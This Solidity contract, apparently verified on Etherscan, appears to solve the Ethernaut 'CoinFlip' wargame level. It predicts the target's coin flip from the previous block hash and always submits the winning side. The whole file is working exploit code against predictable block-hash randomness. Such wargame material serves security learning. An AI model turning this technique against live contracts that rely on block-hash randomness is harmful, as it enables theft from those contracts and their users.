/**
 *Submitted for verification at Etherscan.io on 2022-03-19
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface Coin {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address ethernautAddress = 0x109Be17B35b7C4d4231b6AC32ec7e4e0561003DF;


  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    Coin ethernaut = Coin(ethernautAddress);

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      ethernaut.flip(_guess);
      return true;
    } else {
      consecutiveWins = 0;
      ethernaut.flip(!_guess);
      return false;
    }
  }
}